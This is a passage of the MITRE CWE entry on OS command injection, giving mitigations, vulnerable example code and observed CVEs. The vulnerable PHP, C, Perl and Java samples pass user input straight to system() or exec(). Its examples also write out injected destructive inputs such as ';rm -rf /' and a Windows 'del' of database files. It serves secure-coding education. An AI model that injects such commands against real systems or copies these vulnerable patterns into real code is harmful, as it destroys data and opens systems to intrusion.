               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the data locally in the session's state instead of sending it out to the client in a hidden form field.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.3">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If the program to be executed allows arguments to be specified within an input file or from standard input, then consider using that mode to pass arguments instead of the command line.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>
                  <xhtml:p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</xhtml:p>
                  <xhtml:p>Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When constructing OS command strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ";" and "&gt;" characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components.</xhtml:p>
                  <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Compilation or Build Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.</xhtml:p>
                  <xhtml:p>If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.</xhtml:p>
		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.</xhtml:p>
                  <xhtml:p>In the context of OS Command Injection, error information passed back to the user might reveal whether an OS command is being executed and possibly which command is being used.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>Use runtime policy enforcement to create an allowlist of allowable commands, then prevent use of any command that does not appear in the allowlist. Technologies such as AppArmor are available to do this.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-151">
               <Intro_Text>This example code intends to take the name of a user and list the contents of that user's home directory. It is subject to the first variant of OS command injection.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$userName = $_POST["user"];<xhtml:br/>$command = 'ls -l /home/' . $userName;<xhtml:br/>system($command);</xhtml:div>
               </Example_Code>
               <Body_Text>The $userName variable is not checked for malicious input. An attacker could set the $userName variable to an arbitrary OS command such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>;rm -rf /</xhtml:div>
               </Example_Code>
               <Body_Text>Which would result in $command being:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>ls -l /home/;rm -rf /</xhtml:div>
               </Example_Code>
               <Body_Text>Since the semi-colon is a command separator in Unix, the OS would first execute the ls command, then the rm command, deleting the entire file system.</Body_Text>
               <Body_Text>Also note that this example code is vulnerable to Path Traversal (CWE-22) and Untrusted Search Path (CWE-426) attacks.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-30">
               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int main(int argc, char** argv) {<xhtml:div style="margin-left:1em;">char cmd[CMD_MAX] = "/usr/bin/cat ";<xhtml:br/>strcat(cmd, argv[1]);<xhtml:br/>system(cmd);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
               <Body_Text>Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example is a web application that intends to perform a DNS lookup of a user-supplied domain name. It is subject to the first variant of OS command injection.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>use CGI qw(:standard);<xhtml:br/>$name = param('name');<xhtml:br/>$nslookup = "/path/to/nslookup";<xhtml:br/>print header;<xhtml:br/>if (open($fh, "$nslookup $name|")) {<xhtml:div style="margin-left:1em;">while (&lt;$fh&gt;) {<xhtml:div style="margin-left:1em;">print escapeHTML($_);<xhtml:br/>print "&lt;br&gt;\n";</xhtml:div>}<xhtml:br/>close($fh);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Suppose an attacker provides a domain name like this:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>cwe.mitre.org%20%3B%20/bin/ls%20-l</xhtml:div>
               </Example_Code>
               <Body_Text>The "%3B" sequence decodes to the ";" character, and the %20 decodes to a space. The open() statement would then process a string like this:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>/path/to/nslookup cwe.mitre.org ; /bin/ls -l</xhtml:div>
               </Example_Code>
               <Body_Text>As a result, the attacker executes the "/bin/ls -l" command and gets a list of all the files in the program's working directory. The input could be replaced with much more dangerous commands, such as installing a malicious program on the server.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The example below reads the name of a shell script to execute from the system properties. It is subject to the second variant of OS command injection.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String script = System.getProperty("SCRIPTNAME");<xhtml:br/>if (script != null)<xhtml:div style="margin-left:1em;">System.exec(script);</xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>If an attacker has control over this property, then they could modify the property to point to a dangerous program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the example below, a method is used to transform geographic coordinates from latitude and longitude format to UTM format. The method gets the input coordinates from a user through a HTTP request and executes a program local to the application server that performs the transformation. The method passes the latitude and longitude coordinates as a command-line option to the external program and will perform some processing to retrieve the results of the transformation and return the resulting UTM coordinates.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public String coordinateTransformLatLonToUTM(String coordinates)<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                        <xhtml:div>String utmCoords = null;<xhtml:br/>try {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>String latlonCoords = coordinates;<xhtml:br/>Runtime rt = Runtime.getRuntime();<xhtml:br/>Process exec = rt.exec("cmd.exe /C latlon2utm.exe -" + latlonCoords);<xhtml:br/>
                                 <xhtml:i>// process results of coordinate transform</xhtml:i>
                                 <xhtml:br/>
                                 <xhtml:br/>
                                 <xhtml:i>// ...</xhtml:i>
                                 <xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>}<xhtml:br/>catch(Exception e) {...}<xhtml:br/>return utmCoords;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, the method does not verify that the contents of the coordinates input parameter includes only correctly-formatted latitude and longitude coordinates. If the input coordinates were not validated prior to the call to this method, a malicious user could execute another program local to the application server by appending '&amp;' followed by the command for another program to the end of the coordinate string. The '&amp;' instructs the Windows operating system to execute another program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-28">
               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String btype = request.getParameter("backuptype");<xhtml:br/>String cmd = new String("cmd.exe /K \"<xhtml:div style="margin-left:1em;">c:\\util\\rmanDB.bat "<xhtml:br/>+btype+<xhtml:br/>"&amp;&amp;c:\\utl\\cleanup.bat\"")</xhtml:div>
                     <xhtml:br/>System.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2020-10987</Reference>
               <Description>OS command injection in Wi-Fi router, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-10987</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-10221</Reference>
               <Description>Template functionality in network configuration management tool allows OS command injection, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-10221</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-9054</Reference>
               <Description>Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-9054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0067</Reference>
               <Description>Canonical example of OS command injection. CGI program does not neutralize "|" metacharacter when invoking a phonebook program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-0067</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1246</Reference>
               <Description>Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1246</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0061</Reference>
               <Description>Web server allows command execution using "|" (pipe) character.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0061</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0041</Reference>
               <Description>FTP client does not filter "|" from filenames returned by the server, allowing for OS command injection.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0041</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2575</Reference>
               <Description>Shell metacharacters in a filename in a ZIP archive</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2575</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1898</Reference>
               <Description>Shell metacharacters in a telnet:// link are not properly handled when the launching application processes the link.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1898</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4304</Reference>
               <Description>OS command injection through environment variable.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4304</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4796</Reference>
               <Description>OS command injection through https:// URLs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4796</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3572</Reference>
               <Description>Chain: incomplete denylist for OS command injection</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3572</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-1988</Reference>
               <Description>Product allows remote users to execute arbitrary commands by creating a file whose pathname contains shell metacharacters.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-1988</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Program Invocation</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>System Process</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>OS Command Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Malicious File Execution</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV03-C</Entry_ID>
               <Entry_Name>Sanitize the environment when invoking external programs</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV33-C</Entry_ID>
               <Entry_Name>Do not call system()</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR02-C</Entry_ID>
               <Entry_Name>Sanitize data passed to complex subsystems</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>31</Entry_ID>
               <Entry_Name>OS Commanding</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>IDS07-J</Entry_ID>
               <Entry_Name>Do not pass untrusted, unsanitized data to the Runtime.exec() method</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-78</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="6"/>
            <Related_Attack_Pattern CAPEC_ID="88"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-140"/>
            <Reference External_Reference_ID="REF-685"/>
            <Reference External_Reference_ID="REF-686"/>
            <Reference External_Reference_ID="REF-687" Section="chapter: &#34;CGI Scripts&#34;"/>
            <Reference External_Reference_ID="REF-688"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 10: Command Injection.&#34; Page 171"/>
            <Reference External_Reference_ID="REF-690"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 8, &#34;Shell Metacharacters&#34;, Page 425"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-78"/>
         </References>
         <Notes>
            <Note Type="Terminology">The "OS command injection" phrase carries different meanings to different people. For some people, it only refers to cases in which the attacker injects command separators into arguments for an application-controlled program that is being invoked. For some people, it refers to any type of attack that can allow the attacker to execute OS commands of their own choosing. This usage could include untrusted search path weaknesses (CWE-426) that cause the application to find and execute an attacker-controlled program. Further complicating the issue is the case when argument injection (CWE-88) allows alternate command-line switches or options to be inserted into the command line, such as an "-exec" switch whose purpose may be to execute the subsequent argument as a command (this -exec switch exists in the UNIX "find" command, for example). In this latter case, however, CWE-88 could be regarded as the primary weakness in a chain with CWE-78.</Note>
            <Note Type="Research Gap">More investigation is needed into the distinction between the OS command injection variants, including the role with argument injection (CWE-88). Equivalent distinctions may exist in other injection-related problems such as SQL injection.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships, Research_Gaps, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>KDM Analytics</Modification_Name>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Name, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Detection_Factors, Name, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
